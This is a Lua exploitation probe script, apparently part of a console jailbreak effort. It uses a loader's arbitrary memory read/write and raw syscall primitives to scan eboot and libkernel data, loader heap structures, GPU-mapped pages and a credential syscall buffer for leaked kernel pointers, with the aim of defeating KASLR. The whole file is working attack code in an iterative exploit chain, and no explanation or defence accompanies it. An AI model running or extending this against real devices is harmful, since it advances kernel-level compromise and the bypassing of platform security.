-- CRASH_CLASS: LOW
-- PROBE 56i8: Eboot .data scan + cross-run NID validation + remaining KASLR ideas
--
-- Context: 56i7 proved the 2828 "kernel pointers" in module .data are NID hash tables
-- ({text_offset, nid_hash} packed structs). The table continues below 0xFFFF8000.
--
-- This probe:
--   [B] Scan eboot .data (1.5MB) in safe chunks — 56i7 crashed on this
--   [C] Print first 5 NID table entries as cross-run fingerprint
--       (if dw[1] values change between runs → real kptr; if same → NID hash)
--   [D] Scan libkernel .data EXCLUDING the NID table range
--   [E] Try reading TCB/FS_BASE area for kernel pointers
--   [F] Scan the Lua loader's own globals (near pipe_str/fn_addr addresses)

print("=== PROBE 56i8: EBOOT DATA + CROSS-RUN ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end
local function is_kptr(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF8000 and h < 0xFFFFFFFF
end
local function is_any_krange(val)
    if val == nil then return false end
    local h, l = get_hi_lo(val)
    return h >= 0xFFFF0000 and h < 0xFFFFFFFF
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

local sc_info = make_syscall(593)

-- ============================================================
-- [B] Eboot .data scan — 1.5MB in safe chunks
-- Only scan for values where BOTH dwords look like kernel VA
-- (not packed structs with small offset + hash)
-- ============================================================
print("")
print("[B] Eboot .data scan (true kernel pointers only)")

local eb_info = memory.alloc(0x200)
safe_wd(eb_info, 0x160)
pcall(function() sc_info(uint64(0), eb_info) end)

local ebd_lo = safe_rd(eb_info + 0x118) or 0
local ebd_hi = safe_rd(eb_info + 0x11C) or 0
local ebd_sz = safe_rd(eb_info + 0x120) or 0

print(string.format("  eboot data: 0x%X_%08X size=0x%X", ebd_hi, ebd_lo, ebd_sz))

local eb_true_kptrs = 0
local eb_nid_like = 0

-- Scan full 1.5MB but filter: a TRUE kernel pointer has BOTH halves
-- looking like a kernel address (lo > 0x10000, not a small table offset)
for off = 0, ebd_sz - 1, 8 do
    local a_l = ebd_lo + off
    local a_h = ebd_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
            if vl >= 0x100000 then
                -- Low dword is large — could be real kernel VA low bits
                eb_true_kptrs = eb_true_kptrs + 1
                if eb_true_kptrs <= 20 then
                    print(string.format("  +0x%06X: 0x%08X_%08X TRUE?", off, vh, vl))
                end
            else
                eb_nid_like = eb_nid_like + 1
            end
        end
    end
end
print(string.format("  True kptr candidates: %d  NID-like: %d", eb_true_kptrs, eb_nid_like))

-- ============================================================
-- [C] Cross-run fingerprint — print specific values for comparison
-- Run this twice; if values change → KASLR-shifted → real
-- ============================================================
print("")
print("[C] Cross-run fingerprint")

-- libkernel NID table first 5 entries
local lk_info = memory.alloc(0x200)
safe_wd(lk_info, 0x160)
pcall(function() sc_info(uint64(0x2001), lk_info) end)
local lk_data_lo = safe_rd(lk_info + 0x118) or 0
local lk_data_hi = safe_rd(lk_info + 0x11C) or 0

print("  libkernel NID[0-4]:")
for i = 0, 4 do
    local off = 0x3E38 + i * 8
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    print(string.format("    [%d] %s", i, hexval(val)))
end

-- Also print the NID table START (first entry with hi >= 0xFFFF0000)
-- to see where the table begins
print("  Table start search (data+0x3800..+0x3E38):")
local table_start = nil
for off = 0x3800, 0x3E38, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val then
        local vh, vl = get_hi_lo(val)
        if vh >= 0xFFFF0000 and not table_start then
            table_start = off
            print(string.format("    First 0xFFFF entry at +0x%04X: %s", off, hexval(val)))
        end
    end
end

-- ============================================================
-- [D] libkernel .data OUTSIDE the NID table
-- NID table is at +0x3D38..+0x42C8 (from 56i7 context)
-- Scan before and after for any real kernel pointers
-- ============================================================
print("")
print("[D] libkernel .data outside NID table")

local lk_data_sz = safe_rd(lk_info + 0x120) or 0
local outside_kptrs = 0

-- Before NID table
for off = 0, 0x3D30, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val and is_kptr(val) then
        local vh, vl = get_hi_lo(val)
        -- Skip NID-like (small low dword)
        if vl >= 0x100000 then
            outside_kptrs = outside_kptrs + 1
            print(string.format("  pre-NID +0x%04X: %s", off, hexval(val)))
        end
    end
end

-- After NID table
for off = 0x42D0, lk_data_sz - 1, 8 do
    local a_l = lk_data_lo + off
    local a_h = lk_data_hi
    if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
    local addr = uint64(string.format("0x%X%08X", a_h, a_l))
    local val = safe_rq(addr)
    if val and is_kptr(val) then
        local vh, vl = get_hi_lo(val)
        if vl >= 0x100000 then
            outside_kptrs = outside_kptrs + 1
            if outside_kptrs <= 20 then
                print(string.format("  post-NID +0x%04X: %s", off, hexval(val)))
            end
        end
    end
end
print("  Outside-NID kptrs (lo>=0x100000): " .. outside_kptrs)

-- ============================================================
-- [E] Loader internal structures — scan near fn_addr and rop_chain
-- These are the Lua loader's own heap structures
-- ============================================================
print("")
print("[E] Loader internal structures")

local pipe_str = tostring(syscall.pipe)
print("  pipe_str: " .. pipe_str:sub(1, 120))

local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")

if fn_str then
    print("  fn_addr: " .. fn_str)
    local fn_addr = uint64(fn_str)

    -- Scan 4KB around fn_addr for kernel pointers
    local loader_kptrs = 0
    for off = -0x800, 0x800, 8 do
        local ok2, val = pcall(function()
            if off >= 0 then
                return memory.read_qword(fn_addr + off)
            else
                return memory.read_qword(fn_addr - (-off))
            end
        end)
        if ok2 and val and is_kptr(val) then
            local vh, vl = get_hi_lo(val)
            if vl >= 0x100000 then
                loader_kptrs = loader_kptrs + 1
                print(string.format("  fn_addr%+d: %s", off, hexval(val)))
            end
        end
    end
    print("  Loader area kptrs: " .. loader_kptrs)
end

-- ============================================================
-- [F] GPU mmap region scan — our heap R/W area
-- Allocated GPU pages might contain kernel object remnants
-- ============================================================
print("")
print("[F] GPU mmap heap scan")

local sc_mmap = make_syscall(477)
local gpu_ok, gpu_ret = pcall(function()
    return sc_mmap(uint64(0), uint64(64*0x4000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
local gpu_addr = gpu_ok and gpu_ret or nil

if gpu_addr then
    local gh, gl = get_hi_lo(gpu_addr)
    print(string.format("  GPU mmap: 0x%X_%08X (64 pages)", gh, gl))

    local gpu_kptrs = 0
    -- Scan first 16 pages for remnant kernel pointers
    for off = 0, 16*0x4000 - 1, 8 do
        local a_l = gl + off
        local a_h = gh
        if a_l >= 0x100000000 then a_h = a_h + 1; a_l = a_l - 0x100000000 end
        local addr = uint64(string.format("0x%X%08X", a_h, a_l))
        local val = safe_rq(addr)
        if val then
            local vh, vl = get_hi_lo(val)
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF and vl >= 0x100000 then
                gpu_kptrs = gpu_kptrs + 1
                if gpu_kptrs <= 10 then
                    print(string.format("  +0x%06X: %s", off, hexval(val)))
                end
            end
        end
    end
    print("  GPU heap kptrs: " .. gpu_kptrs)
else
    print("  GPU mmap failed")
end

-- ============================================================
-- [G] sys 587 credential with correct arg layout from 55e
-- 55e got ret=0 with 0x88 bytes. 56i3 got ret=-1.
-- Try 55e's arg layout: sc587(0, buf, size)
-- ============================================================
print("")
print("[G] sys 587 credential retry")

local sc587 = make_syscall(587)
local cred_buf = memory.alloc(0x200)
for i = 0, 0x7F do safe_wd(cred_buf + i*4, 0) end

local cok, cret = pcall(function()
    return sc587(uint64(0), uint64(cred_buf), uint64(0x200))
end)
local c_ret = cok and to_num(cret) or -999
print("  ret=" .. c_ret)

if c_ret == 0 then
    -- Scan for kernel pointers
    local ck = 0
    for off = 0, 0x1F8, 8 do
        local val = safe_rq(cred_buf + off)
        if val and is_kptr(val) then
            ck = ck + 1
            print(string.format("  +0x%02X: %s KPTR!", off, hexval(val)))
        end
    end
    -- Dump first 32 dwords
    print("  First 128 bytes:")
    for off = 0, 0x7C, 4 do
        local v = safe_rd(cred_buf + off)
        if v and v ~= 0 then
            print(string.format("    +0x%02X: 0x%08X", off, v))
        end
    end
end

collectgarbage("restart")

print("")
print("=== PROBE 56i8 COMPLETE ===")
